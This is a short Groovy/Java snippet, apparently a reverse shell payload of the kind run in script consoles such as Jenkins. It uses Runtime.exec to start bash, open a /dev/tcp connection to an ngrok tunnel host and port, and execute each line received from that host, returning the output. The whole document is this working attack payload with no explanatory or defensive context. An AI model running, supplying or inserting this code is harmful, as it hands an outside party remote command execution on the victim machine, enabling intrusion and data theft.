r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/2.tcp.ngrok.io/16352;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
